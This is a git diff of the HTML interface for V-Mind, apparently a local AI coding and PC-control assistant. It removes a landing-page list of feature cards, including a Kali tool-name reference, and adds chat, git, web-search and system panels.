+      <div class="item" data-view="library" onclick="switchView('library')"><svg viewBox="0 0 24 24"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/><line x1="8" y1="7" x2="16" y2="7"/><line x1="8" y1="11" x2="14" y2="11"/></svg>Library</div>
+      <div class="item" data-view="settings" onclick="switchView('settings')"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>Settings</div>
+    </div>
+    <div class="section">
+      <div class="section-title">Mode</div>
+      <div id="mode-toggle"><button class="active" data-mode="vibe" onclick="setMode('vibe')"><span class="mode-icon">~</span>Vibe</button><button data-mode="spec" onclick="setMode('spec')"><span class="mode-icon">#</span>Spec</button></div>
+    </div>
+    <div class="spacer"></div>
+    <div class="bottom">
+      <div class="item" onclick="toggleTerminal()"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>Terminal</div>
+      <div class="item" id="status"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></svg><span id="status-text">connecting...</span></div>
     </div>
   </div>
 
-  <div class="features">
-    <h2>Every feature at your command</h2>
-    <p class="subtitle">130+ capabilities across 19 categories — click any card for a live demo</p>
-
-    <!-- Category: AI Core -->
-    <div class="cat-title"><span>&#129302;</span> AI Agent Core</div>
-    <div class="feature-grid">
-      <div class="feature-card" onclick="showFeature(0)"><div class="feature-icon">&#129302;</div><h3>Multi-Backend LLM</h3><p>Auto-switches between Ollama (local) and OpenRouter (cloud). Set to auto, local, or remote.</p></div>
-      <div class="feature-card" onclick="showFeature(1)"><div class="feature-icon">&#128172;</div><h3>Multi-Turn Chat</h3><p>Full conversation history with 12-turn context window. Streaming token-by-token responses.</p></div>
-      <div class="feature-card" onclick="showFeature(2)"><div class="feature-icon">&#9889;</div><h3>Vibe &amp; Spec Modes</h3><p>Vibe: free-form genius conversation. Spec: plan-then-execute with analysis, steps, review.</p></div>
-      <div class="feature-card" onclick="showFeature(3)"><div class="feature-icon">&#128214;</div><h3>Tool-Calling Loop</h3><p>25-turn tool execution loop. Uses <code>think</code> for chain-of-thought reasoning before acting.</p></div>
-      <div class="feature-card" onclick="showFeature(4)"><div class="feature-icon">&#127912;</div><h3>Session Management</h3><p>Create, rename, switch, and delete multiple chat sessions. Persisted in browser localStorage.</p></div>
-    </div>
-
-    <!-- Category: AI Models -->
-    <div class="cat-title"><span>&#127760;</span> Model Support</div>
-    <div class="feature-grid">
-      <div class="feature-card" onclick="showFeature(5)"><div class="feature-icon">&#128187;</div><h3>Ollama Models</h3><p>TinyLlama, Qwen 2.5, CodeLlama, Mistral, Llama 3.x, Gemma 4, and any Ollama-pulled model.</p></div>
-      <div class="feature-card" onclick="showFeature(6)"><div class="feature-icon">&#9729;&#65039;</div><h3>Cloud Models</h3><p>GPT-4o, GPT-4.1, Claude 3.5 Sonnet, Llama 3.3 70B, Hermes 3 405B, GPT-OSS 120B, and more.</p></div>
-      <div class="feature-card" onclick="showFeature(7)"><div class="feature-icon">&#127937;</div><h3>Free Models</h3><p>Cohere North Mini Code, GPT-OSS 120B, Gemma 4 26B/31B, Hermes 3 405B — all free via OpenRouter.</p></div>
-      <div class="feature-card" onclick="showFeature(8)"><div class="feature-icon">&#127919;</div><h3>Configurable</h3><p>Switch models anytime. Set temperature (0-1). Backend auto-detects Ollama or falls back to cloud.</p></div>
-    </div>
-
-    <!-- Category: File Operations -->
-    <div class="cat-title"><span>&#128193;</span> File Operations</div>
-    <div class="feature-grid">
-      <div class="feature-card" onclick="showFeature(9)"><div class="feature-icon">&#128196;</div><h3>Read / Write / Edit</h3><p>Read with line numbers, write with auto-create dirs, targeted text replacement edits.</p></div>
-      <div class="feature-card" onclick="showFeature(10)"><div class="feature-icon">&#128269;</div><h3>Glob &amp; List Dir</h3><p>Wildcard file search (<code>**/*.py</code>). Directory listing with sizes and types.</p></div>
-      <div class="feature-card" onclick="showFeature(11)"><div class="feature-icon">&#128196;</div><h3>Multi-Format Reader</h3><p>PDF, DOCX, XLSX, CSV, image OCR (placeholder), and plain text. Extracts content from any document.</p></div>
-      <div class="feature-card" onclick="showFeature(12)"><div class="feature-icon">&#128230;</div><h3>File Upload</h3><p>Upload 30+ file types via browser. Images sent as base64 for vision analysis. Max 500MB.</p></div>
-      <div class="feature-card" onclick="showFeature(13)"><div class="feature-icon">&#128190;</div><h3>Delete &amp; Manage</h3><p>Delete files, empty directories. Full file tree browser in the UI with expand/collapse.</p></div>
-    </div>
-
-    <!-- Category: Shell & Commands -->
-    <div class="cat-title"><span>&#9000;&#65039;</span> Shell &amp; Terminal</div>
-    <div class="feature-grid">
-      <div class="feature-card" onclick="showFeature(14)"><div class="feature-icon">&#128421;&#65039;</div><h3>Run Any Command</h3><p>Execute shell commands with configurable timeout (default 30s). Async subprocess execution.</p></div>
-      <div class="feature-card" onclick="showFeature(15)"><div class="feature-icon">&#128187;</div><h3>Built-in Terminal</h3><p>In-browser collapsible terminal panel. Sends commands to <code>/api/exec</code> with stdout/stderr capture.</p></div>
-      <div class="feature-card" onclick="showFeature(16)"><div class="feature-icon">&#9201;&#65039;</div><h3>Long-Running Tasks</h3><p>Run background/long-running commands without blocking the chat. Output capped at 30KB.</p></div>
-    </div>
-
-    <!-- Category: Web Search -->
-    <div class="cat-title"><span>&#127760;</span> Web Search &amp; Browsing</div>
-    <div class="feature-grid">
-      <div class="feature-card" onclick="showFeature(17)"><div class="feature-icon">&#128269;</div><h3>Web Search</h3><p>DuckDuckGo search returning titles, URLs, and snippets. Supports text, images, videos, news.</p></div>
-      <div class="feature-card" onclick="showFeature(18)"><div class="feature-icon">&#128279;</div><h3>Fetch Pages</h3><p>Fetches any URL, strips HTML/JS/CSS, returns readable text (up to 8000 chars).</p></div>
-      <div class="feature-card" onclick="showFeature(19)"><div class="feature-icon">&#127760;</div><h3>Wikipedia</h3><p>Query Wikipedia page summaries with title, description, extract, thumbnail.</p></div>
-      <div class="feature-card" onclick="showFeature(20)"><div class="feature-icon">&#128228;</div><h3>Search Suggestions</h3><p>DuckDuckGo autocomplete suggestions for search-as-you-type functionality.</p></div>
-      <div class="feature-card" onclick="showFeature(21)"><div class="feature-icon">&#127917;</div><h3>In-App Browser</h3><p>Built-in iframe browser with back/forward, URL bar, text-rendering fallback for blocked pages.</p></div>
-    </div>
-
-    <!-- Category: Git -->
-    <div class="cat-title"><span>&#128200;</span> Git Integration</div>
-    <div class="feature-grid">
-      <div class="feature-card" onclick="showFeature(22)"><div class="feature-icon">&#128200;</div><h3>Status &amp; Diff</h3><p>View working tree status, unstaged/staged diffs filtered by file. Branch info included.</p></div>
-      <div class="feature-card" onclick="showFeature(23)"><div class="feature-icon">&#128214;</div><h3>Commit &amp; Log</h3><p>Commit with message, auto-add tracked files. View recent history with graph decoration.</p></div>
-      <div class="feature-card" onclick="showFeature(24)"><div class="feature-icon">&#128279;</div><h3>Push / Pull / Clone</h3><p>Push to remote, pull from remote, clone repos. Configurable authentication tokens.</p></div>
-      <div class="feature-card" onclick="showFeature(25)"><div class="feature-icon">&#128736;&#65039;</div><h3>Branch Management</h3><p>List, create, delete, switch branches. Show current branch. Diff any commit range.</p></div>
-      <div class="feature-card" onclick="showFeature(26)"><div class="feature-icon">&#129302;</div><h3>Auto-Commit &amp; PR</h3><p>AI-generated commit messages via GPT-4o-mini. Create GitHub PRs via <code>gh</code> CLI.</p></div>
-      <div class="feature-card" onclick="showFeature(27)"><div class="feature-icon">&#128194;</div><h3>Mini Git UI</h3><p>Inline panel: branch/changed files, diff viewer, commit input, log, push/pull, branches dialog.</p></div>
-    </div>
-
-    <!-- Category: Code Intelligence -->
-    <div class="cat-title"><span>&#128221;</span> Code Intelligence</div>
-    <div class="feature-grid">
-      <div class="feature-card" onclick="showFeature(28)"><div class="feature-icon">&#127919;</div><h3>Project Indexing</h3><p>Index codebases for semantic search. Detects project type (Node, Python, Rust, Go, Java, etc.).</p></div>
-      <div class="feature-card" onclick="showFeature(29)"><div class="feature-icon">&#128269;</div><h3>Semantic Code Search</h3><p>Find relevant code by meaning, not keywords. Uses embeddings + cosine similarity.</p></div>
-      <div class="feature-card" onclick="showFeature(30)"><div class="feature-icon">#</div><h3>Regex Grep</h3><p>Fast ripgrep-based regex search across files with optional file-glob filter.</p></div>
-      <div class="feature-card" onclick="showFeature(31)"><div class="feature-icon">&#128200;</div><h3>Codebase Stats</h3><p>File count, chunk count, extension breakdown. Auto-detects dependencies.</p></div>
-      <div class="feature-card" onclick="showFeature(32)"><div class="feature-icon">&#128240;</div><h3>Code Viewer</h3><p>Line-numbered code display with syntax highlighting. Open files from the tree.</p></div>
-    </div>
-
-    <!-- Category: Auto-Fix -->
-    <div class="cat-title"><span>&#128295;</span> Linting &amp; Auto-Fix</div>
-    <div class="feature-grid">
-      <div class="feature-card" onclick="showFeature(33)"><div class="feature-icon">&#128220;</div><h3>Run Linters</h3><p>Auto-detect &amp; run ruff, flake8, pylint, eslint, tsc, mypy, black, prettier.</p></div>
-      <div class="feature-card" onclick="showFeature(34)"><div class="feature-icon">&#128270;</div><h3>Run Tests</h3><p>Auto-detect &amp; run pytest, jest, vitest, go test. Integrated into the fix loop.</p></div>
-      <div class="feature-card" onclick="showFeature(35)"><div class="feature-icon">&#128295;</div><h3>Auto-Fix Issues</h3><p>Fix lint/format issues with ruff --fix, black, prettier. Self-healing codebase.</p></div>
-      <div class="feature-card" onclick="showFeature(36)"><div class="feature-icon">&#9889;</div><h3>Auto-Fix Loop</h3><p>The crown jewel: lint &#8594; fix &#8594; test, iteratively until clean. Fully automated self-healing.</p></div>
-    </div>
-
-    <!-- Category: Planner -->
-    <div class="cat-title"><span>&#128195;</span> Project Planner</div>
-    <div class="feature-grid">
-      <div class="feature-card" onclick="showFeature(37)"><div class="feature-icon">&#128195;</div><h3>Create Plans</h3><p>Break complex goals into step-by-step plans with task dependencies, generated by AI.</p></div>
-      <div class="feature-card" onclick="showFeature(38)"><div class="feature-icon">&#128203;</div><h3>Track Progress</h3><p>List all saved plans, show task status (pending/running/done/failed), update tasks.</p></div>
-      <div class="feature-card" onclick="showFeature(39)"><div class="feature-icon">&#128279;</div><h3>Dependency Chain</h3><p>Get next actionable tasks whose dependencies are met. Persistent plans saved to disk.</p></div>
-    </div>
-
-    <!-- Category: PC Control -->
-    <div class="cat-title"><span>&#128187;</span> PC Control &amp; Automation</div>
-    <div class="feature-grid">
-      <div class="feature-card" onclick="showFeature(40)"><div class="feature-icon">&#128187;</div><h3>Launch Apps</h3><p>Launch any app by name or path. List installed applications from Program Files/Start Menu.</p></div>
-      <div class="feature-card" onclick="showFeature(41)"><div class="feature-icon">&#128200;</div><h3>Process Management</h3><p>List running processes (PID, name, CPU%, RAM%), kill by name or PID.</p></div>
-      <div class="feature-card" onclick="showFeature(42)"><div class="feature-icon">&#128424;</div><h3>Mouse &amp; Keyboard</h3><p>Move cursor, click (left/right/middle), type text, press keys (enter, esc, F5, etc.).</p></div>
-      <div class="feature-card" onclick="showFeature(43)"><div class="feature-icon">&#128248;</div><h3>Screenshot</h3><p>Capture screen via mss or PowerShell. Save as PNG for analysis.</p></div>
-      <div class="feature-card" onclick="showFeature(44)"><div class="feature-icon">&#128203;</div><h3>Clipboard</h3><p>Read and write clipboard text. Monitor clipboard changes.</p></div>
-      <div class="feature-card" onclick="showFeature(45)"><div class="feature-icon">&#128265;</div><h3>Window Management</h3><p>List open windows, bring any window to foreground by title match.</p></div>
-    </div>
-
-    <!-- Category: System -->
-    <div class="cat-title"><span>&#128295;</span> System &amp; Hardware</div>
-    <div class="feature-grid">
-      <div class="feature-card" onclick="showFeature(46)"><div class="feature-icon">&#128200;</div><h3>System Info</h3><p>OS, CPU cores/usage, RAM usage, disk usage, boot time, Python version, hostname.</p></div>
-      <div class="feature-card" onclick="showFeature(47)"><div class="feature-icon">&#9889;</div><h3>Power Commands</h3><p>Shutdown, restart, sleep, hibernate, lock, logoff — all from chat.</p></div>
-      <div class="feature-card" onclick="showFeature(48)"><div class="feature-icon">&#128266;</div><h3>Volume &amp; Notify</h3><p>Set system volume (0-100). Show Windows toast notifications.</p></div>
-      <div class="feature-card" onclick="showFeature(49)"><div class="feature-icon">&#128267;</div><h3>Battery Status</h3><p>Get battery charge percentage and status. Ping hosts for reachability.</p></div>
-      <div class="feature-card" onclick="showFeature(50)"><div class="feature-icon">&#128274;</div><h3>Port Scanning</h3><p>Async TCP port scanning to check which ports are open on any host.</p></div>
-    </div>
-
-    <!-- Category: Voice -->
-    <div class="cat-title"><span>&#127911;</span> Voice I/O</div>
-    <div class="feature-grid">
-      <div class="feature-card" onclick="showFeature(51)"><div class="feature-icon">&#127908;</div><h3>Speech-to-Text</h3><p>Browser SpeechRecognition API for voice input. Speak naturally to V-Mind.</p></div>
-      <div class="feature-card" onclick="showFeature(52)"><div class="feature-icon">&#128266;</div><h3>Text-to-Speech</h3><p>Windows TTS (System.Speech) and browser SpeechSynthesis for audible responses.</p></div>
-    </div>
-
-    <!-- Category: The Layer -->
-    <div class="cat-title"><span>&#128736;&#65039;</span> The Layer — Kali Command Reference</div>
-    <div class="feature-grid">
-      <div class="feature-card" onclick="showFeature(53)"><div class="feature-icon">&#128270;</div><h3>Recon Tools</h3><p>nmap, netdiscover, dnsrecon — network discovery &amp; reconnaissance reference.</p></div>
-      <div class="feature-card" onclick="showFeature(54)"><div class="feature-icon">&#128269;</div><h3>Scanning Tools</h3><p>nikto, wpscan, dirb, gobuster — web &amp; service vulnerability scanning.</p></div>
-      <div class="feature-card" onclick="showFeature(55)"><div class="feature-icon">&#128520;</div><h3>Exploitation</h3><p>msfconsole, msfvenom, sqlmap, hydra — exploitation framework reference.</p></div>
-      <div class="feature-card" onclick="showFeature(56)"><div class="feature-icon">&#128295;</div><h3>Post-Exploitation</h3><p>linpeas, enum4linux, john, hashcat — post-exploitation &amp; password tools.</p></div>
-      <div class="feature-card" onclick="showFeature(57)"><div class="feature-icon">&#128279;</div><h3>Web &amp; Network</h3><p>whatweb, wfuzz, burpsuite, tcpdump, tshark, aireplay, macchanger.</p></div>
-      <div class="feature-card" onclick="showFeature(58)"><div class="feature-icon">&#128187;</div><h3>Interactive TUI</h3><p>Full terminal UI with Rich layout, session sidebar, simulated Kali environment with ls/cat/pwd.</p></div>
-    </div>
-
-    <!-- Category: Library -->
-    <div class="cat-title"><span>&#128218;</span> Library &amp; Books</div>
-    <div class="feature-grid">
-      <div class="feature-card" onclick="showFeature(59)"><div class="feature-icon">&#128218;</div><h3>Built-in Books</h3><p>Python 3 Quick Reference, Git Mastery, Linux CLI Handbook, Algorithms &amp; Data Structures.</p></div>
-      <div class="feature-card" onclick="showFeature(60)"><div class="feature-icon">&#128214;</div><h3>Book Reader</h3><p>Full in-app reader with markdown rendering (headings, code blocks, paragraphs).</p></div>
-      <div class="feature-card" onclick="showFeature(61)"><div class="feature-icon">&#128228;</div><h3>Search &amp; Upload</h3><p>Search local books, upload new ones. Web catalog lookup with cover art from Open Library.</p></div>
-    </div>
-
-    <!-- Category: Monitoring -->
-    <div class="cat-title"><span>&#128200;</span> Monitoring &amp; Notifications</div>
-    <div class="feature-grid">
-      <div class="feature-card" onclick="showFeature(62)"><div class="feature-icon">&#128200;</div><h3>Resource Monitor</h3><p>CPU &amp; RAM spike detection (>90%). Process start/end tracking. Clipboard change detection.</p></div>
-      <div class="feature-card" onclick="showFeature(63)"><div class="feature-icon">&#128196;</div><h3>File Watcher</h3><p>Detects file creations, modifications, deletions via watchdog. Last 500 events stored.</p></div>
-      <div class="feature-card" onclick="showFeature(64)"><div class="feature-icon">&#128276;</div><h3>Proactive Alerts</h3><p>Browser notifications for important events (process ended, CPU spike, file created/deleted).</p></div>
-      <div class="feature-card" onclick="showFeature(65)"><div class="feature-icon">&#128065;</div><h3>Vision Monitor</h3><p>Screenshots every 3s sent to vision AI for real-time screen description and analysis.</p></div>
-    </div>
-
-    <!-- Category: Context & Memory -->
-    <div class="cat-title"><span>&#129504;</span> Context &amp; Memory</div>
-    <div class="feature-grid">
-      <div class="feature-card" onclick="showFeature(66)"><div class="feature-icon">&#128203;</div><h3>Project Context</h3><p>Save task context, architecture notes, decisions with timestamps. Retrieve by key.</p></div>
-      <div class="feature-card" onclick="showFeature(67)"><div class="feature-icon">&#128214;</div><h3>File Memory</h3><p>Remember what each file is for. Get context about remembered files anytime.</p></div>
-      <div class="feature-card" onclick="showFeature(68)"><div class="feature-icon">&#129504;</div><h3>Long-Term Memory</h3><p>Save/search information by key, content, and category. Persists in ~/.v-mind/memory.json.</p></div>
-    </div>
-
-    <!-- Category: Generator -->
-    <div class="cat-title"><span>&#128295;</span> Project Generator &amp; More</div>
-    <div class="feature-grid">
-      <div class="feature-card" onclick="showFeature(69)"><div class="feature-icon">&#128295;</div><h3>Generate Projects</h3><p>Describe a project in natural language, V-Mind builds the entire codebase from scratch.</p></div>
-      <div class="feature-card" onclick="showFeature(70)"><div class="feature-icon">&#127912;</div><h3>Dynamic Backgrounds</h3><p>12+ animated Kali-themed backgrounds cycling across 6 panels, changing every hour.</p></div>
-      <div class="feature-card" onclick="showFeature(71)"><div class="feature-icon">&#128752;</div><h3>Works Offline</h3><p>Fully offline with Ollama and local models. No internet needed after setup. Your data stays local.</p></div>
-    </div>
-  </div>
-</div>
-
-<div class="modal-overlay" id="modal">
-  <div class="modal">
-    <div class="modal-header">
-      <span class="micon" id="micon"></span>
-      <h3 id="mtitle"></h3>
-      <button class="modal-close" onclick="closeModal()">&times;</button>
-    </div>
-    <div class="modal-body" id="mbody"></div>
-  </div>
-</div>
-
-<div class="app-mode" id="app">
-  <div class="app-header">
-    <span class="logo">V-Mind</span>
-    <input class="url-input" id="backendUrl" value="http://127.0.0.1:8765" placeholder="Backend URL (e.g. http://192.168.1.5:8765)">
-    <button class="back-btn" onclick="showLanding()">&#8592; Back</button>
-    <span class="status-dot" id="statusDot"></span>
-    <span class="connection-status" id="connStatus">Not connected</span>
-  </div>
-  <div class="settings-bar">
-    <label>Mode:</label>
-    <button class="mode-tab active" id="modeBackend" onclick="setMode('backend')">Backend</button>
-    <button class="mode-tab" id="modeApi" onclick="setMode('api')">API Key</button>
-    <div id="apiSettings">
-      <label>Provider:</label>
-      <select id="apiProvider"><option value="openai">OpenAI</option><option value="openrouter">OpenRouter</option></select>
-      <label>Key:</label>
-      <input id="apiKeyInput" type="password" placeholder="sk-..." style="flex:1;min-width:120px">
-      <label>Model:</label>
-      <select id="modelSelect"><option value="gpt-4o-mini">GPT-4o Mini</option><option value="gpt-4o">GPT-4o</option></select>
-    </div>
-  </div>
-  <div class="main-app">
-    <div id="chat-panel">
+  <div id="main">
+    <!-- CHAT PANEL -->
+    <div id="panel-chat">
+      <div class="panel-bg" id="bg-chat"></div>
+      <div class="settings-bar">
+        <button class="back-btn" onclick="showLanding()" style="padding:3px 8px;background:var(--surface);border:1px solid var(--border);border-radius:4px;color:var(--dim);cursor:pointer;font-size:10px;font-family:inherit">&#8592; Landing</button>
+        <label>Mode:</label>
+        <button class="mode-tab active" id="modeBackend" onclick="setMode('backend')">Backend</button>
+        <button class="mode-tab" id="modeApi" onclick="setMode('api')">API Key</button>
+        <div id="apiSettings">
+          <select id="apiProvider" style="width:auto"><option value="openai">OpenAI</option><option value="openrouter">OpenRouter</option></select>
+          <input id="apiKeyInput" type="password" placeholder="sk-..." style="width:140px">
+          <select id="modelSelect" style="width:auto"><option value="gpt-4o-mini">GPT-4o Mini</option></select>
+        </div>
+        <span style="margin-left:auto;font-size:10px;color:var(--dim)"><span id="mode-badge" style="color:var(--green)">~ Vibe</span> <span id="m-badge" style="color:var(--dim)">gpt-4o</span></span>
+      </div>
       <div id="chat-area">
-        <div id="chat-messages">
-          <div class="chat-msg assistant" style="color:var(--dim)">
-            Connect to your V-Mind backend or enter an API key to start chatting.<br><br>
-            <b style="color:var(--accent);font-size:15px">&#9889; Choose "Backend" or "API Key" mode above</b>
+        <div id="chat-inner"></div>
+        <div id="cover-page">
+          <div class="cover-bg"></div>
+          <div class="cover-content">
+            <div class="cover-logo"><svg viewBox="0 0 40 40" width="48" height="48"><defs><linearGradient id="lg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#3fb950"/><stop offset="100%" stop-color="#58a6ff"/></linearGradient></defs><rect width="40" height="40" rx="10" fill="url(#lg)"/><text x="20" y="27" text-anchor="middle" fill="#0d1117" font-size="22" font-weight="900" font-family="sans-serif">V</text></svg></div>
+            <h1 class="cover-title">V-Mind</h1>
+            <p class="cover-tagline">Your super-intelligent AI. Code, explore, create.</p>
+            <div class="cover-actions">
+              <button class="cover-btn primary" onclick="startChat()"><svg viewBox="0 0 24 24" width="14" height="14"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" fill="currentColor"/></svg> New Chat</button>
+              <button class="cover-btn" onclick="switchView('browser')">&#127760; Browse Web</button>
+              <button class="cover-btn" onclick="switchView('library')">&#128218; Library</button>
+              <button class="cover-btn" onclick="openFolder()">&#128193; Open Folder</button>
+              <button class="cover-btn" onclick="switchView('layer')">&#128736; The Layer</button>
+            </div>
+            <div class="cover-footer"><span>Type anything to begin</span> <span class="dot">&middot;</span> <span>Backend URL or API Key</span></div>
           </div>
         </div>
       </div>
-      <div class="input-area">
-        <div class="input-row">
-          <input id="chatInput" type="text" placeholder="Type a message..." disabled onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();sendChat()}">
-          <button id="sendBtn" onclick="sendChat()" disabled>Send</button>
+      <div id="file-preview"></div>
+      <div id="input-wrap">
+        <div id="input-bar">
+          <input id="backendUrl" type="text" value="http://127.0.0.1:8765" placeholder="Backend URL..." style="display:block;flex:1;background:transparent;border:none;color:var(--text);font-size:11px;font-family:inherit;outline:none">
+          <button class="upload-btn" onclick="document.getElementById('file-input').click()" title="Attach file">+</button>
+          <input id="file-input" type="file" multiple hidden onchange="uploadFiles(this.files)">
+          <button id="mic-btn" class="mic-btn" onclick="toggleMic()" title="Voice input">&#127908;</button>
+          <input id="chat-input" type="text" placeholder="Message V-Mind..." autofocus onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();sendMsg()}">
+          <button id="send-btn" onclick="sendMsg()">Send</button>
+          <button id="speaker-btn" class="speaker-btn" onclick="toggleSpeaker()" title="Toggle speech output">&#128266;</button>
         </div>
       </div>
     </div>
-    <div id="info-panel">
-      <div class="info-card">
-        <h3>&#127760; How to connect</h3>
-        <p><b>Backend mode</b> — Run V-Mind locally (<code>python run_server.py</code>), enter the URL.</p>
-        <p><b>API Key mode</b> — Enter any OpenAI/OpenRouter key and chat directly from the browser. No backend needed.</p>
-        <p>Your key is stored locally and never sent anywhere except the API provider.</p>
+
+    <!-- REVIEW PANEL -->
+    <div id="panel-review">
+      <div class="panel-bg" id="bg-review"></div>
+      <div id="rev-tabs">
+        <button class="active" data-rtab="code" onclick="switchReviewTab('code',this)">Code</button>
+        <button data-rtab="git" onclick="switchReviewTab('git',this)">Git</button>
+        <button data-rtab="google" onclick="switchReviewTab('google',this)">Google</button>
+        <button data-rtab="system" onclick="switchReviewTab('system',this)">System</button>
+        <button data-rtab="events" onclick="switchReviewTab('events',this)">Events</button>
+        <button data-rtab="project" onclick="switchReviewTab('project',this)">Project</button>
+        <button data-rtab="monitor" onclick="switchReviewTab('monitor',this)">Monitor</button>
       </div>
-      <div class="info-card">
-        <h3>&#9889; All 70+ Features</h3>
-        <p>Scroll through the landing page to see every V-Mind capability. Click any card for a live demo.</p>
+      <div id="rtab-code" class="rtab active"><div id="cv-header"><span id="cv-path">Select a file</span></div><div id="cv-content" style="color:var(--dim);padding:10px;font-size:12px">Open a file from the file tree.</div></div>
+      <div id="rtab-git" class="rtab">
+        <div style="padding:4px 6px;border-bottom:1px solid var(--border);flex-direction:column;gap:3px">
+          <div style="display:flex;align-items:center;gap:6px;font-size:11px"><span id="git-branch"></span><span id="git-remote" style="color:var(--dim);font-size:9px"></span><button onclick="showGitSetup()" style="margin-left:auto;padding:2px 8px;background:transparent;border:1px solid var(--border);color:var(--dim);border-radius:3px;cursor:pointer;font-size:9px;font-family:inherit">Setup</button></div>
+          <div style="display:flex;gap:4px;flex-wrap:wrap">
+            <button onclick="showMiniGitTab('status',this)" style="padding:2px 8px;background:var(--surface);border:1px solid var(--border);color:var(--dim);border-radius:3px;cursor:pointer;font-size:9px;font-family:inherit" class="git-tab-btn active">Status</button>
+            <button onclick="showMiniGitTab('log',this)" style="padding:2px 8px;background:var(--surface);border:1px solid var(--border);color:var(--dim);border-radius:3px;cursor:pointer;font-size:9px;font-family:inherit" class="git-tab-btn">Log</button>
+            <button onclick="showMiniGitTab('commit',this)" style="padding:2px 8px;background:var(--surface);border:1px solid var(--border);color:var(--dim);border-radius:3px;cursor:pointer;font-size:9px;font-family:inherit" class="git-tab-btn">Commit</button>
+            <button onclick="gitPush()" style="padding:2px 8px;background:var(--surface);border:1px solid var(--border);color:var(--dim);border-radius:3px;cursor:pointer;font-size:9px;font-family:inherit">Push</button>
+            <button onclick="gitPull()" style="padding:2px 8px;background:var(--surface);border:1px solid var(--border);color:var(--dim);border-radius:3px;cursor:pointer;font-size:9px;font-family:inherit">Pull</button>
+            <button onclick="showBranchDialog()" style="padding:2px 8px;background:var(--surface);border:1px solid var(--border);color:var(--dim);border-radius:3px;cursor:pointer;font-size:9px;font-family:inherit">Branch</button>
+          </div>
+        </div>
+        <div id="git-content" style="flex:1;overflow:auto;padding:4px 0"></div>
+        <div id="git-commit-bar" style="display:none;padding:4px 8px;border-top:1px solid var(--border)"><input id="git-commit-input" type="text" placeholder="Commit message..." style="flex:1;background:var(--surface);border:1px solid var(--border);border-radius:3px;padding:4px 6px;color:var(--text);font-size:11px;font-family:inherit;outline:none" onkeydown="if(event.key==='Enter')gitCommit()"><button onclick="gitCommit()" style="padding:4px 10px;background:var(--green);color:#000;border:none;border-radius:3px;font-weight:600;cursor:pointer;font-size:10px;font-family:inherit">Commit</button></div>
       </div>
+      <div id="rtab-google" class="rtab">
+        <div id="gsearch-header">
+          <div class="glogo">V<span>-</span>Search</div>
+          <div id="gsearch-bar"><input id="gsearch-input" type="text" placeholder="Search the web..." autocomplete="off" onkeydown="if(event.key==='Enter')gsearch()" oninput="gAutoComplete(this.value)"><button onclick="gsearch()">Search</button><div id="gsearch-suggest" style="display:none;position:absolute;top:100%;left:0;right:0;background:var(--surface);border:1px solid var(--border);border-top:none;border-radius:0 0 6px 6px;z-index:100;max-height:240px;overflow:auto"></div></div>
+          <div id="gsearch-filters" style="display:flex;gap:4px;align-items:center;margin-top:4px;font-size:10px"><span style="color:var(--dim)">Time:</span><select id="gs-time" onchange="gsearch()" style="background:var(--surface);border:1px solid var(--border);border-radius:3px;padding:2px 4px;color:var(--text);font-size:10px;font-family:inherit;outline:none"><option value="">Any time</option><option value="d">24h</option><option value="w">Week</option><option value="m">Month</option><option value="y">Year</option></select></div>
+        </div>
+        <div id="gsearch-tabs"><button class="active" data-gtab="text" onclick="switchGSearchTab('text',this)">Web</button><button data-gtab="images" onclick="switchGSearchTab('images',this)">Images</button><button data-gtab="videos" onclick="switchGSearchTab('videos',this)">Videos</button><button data-gtab="news" onclick="switchGSearchTab('news',this)">News</button></div>
+        <div id="gsearch-stats"></div>
+        <div id="gsearch-main"><div id="gsearch-results" style="flex:1;min-width:0;font-size:11px;color:var(--dim)"></div><div id="gsearch-knowledge" style="display:none;width:240px;flex-shrink:0;border-left:1px solid var(--border);padding:10px;font-size:11px;overflow-y:auto"></div></div>
+      </div>
+      <div id="rtab-system" class="rtab">
+        <div style="padding:6px 8px;display:flex;gap:4px;border-bottom:1px solid var(--border);flex-wrap:wrap">
+          <button onclick="runSysCmd('sys_info')" style="padding:3px 8px;background:var(--surface);border:1px solid var(--border);color:var(--text);border-radius:3px;cursor:pointer;font-size:10px;font-family:inherit">System Info</button>
+          <button onclick="runSysCmd('list_processes')" style="padding:3px 8px;background:var(--surface);border:1px solid var(--border);color:var(--text);border-radius:3px;cursor:pointer;font-size:10px;font-family:inherit">Processes</button>
